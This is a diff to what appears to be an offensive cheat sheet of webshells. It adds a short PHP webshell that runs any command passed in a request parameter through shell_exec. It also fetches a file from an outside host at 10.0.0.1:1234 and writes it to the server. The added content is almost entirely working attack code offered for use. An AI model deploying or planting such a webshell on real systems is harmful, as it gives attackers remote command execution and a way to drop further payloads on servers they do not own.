@@ -28,6 +28,18 @@ Basic webshell with HTML input form
 </html>
 ```
 
+File upload and a simple webshell.
+
+```php
+if (isset($_REQUEST['fupload'])) {
+  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.0.0.1:1234/" . $_REQUEST['fupload']));
+};
+
+if (isset($_REQUEST['fexec'])) {
+  echo shell_exec($_REQUEST['fexec']);
+};
+```
+
 ## 02 - Oneliners
 
 ### 2.1 - MySQL
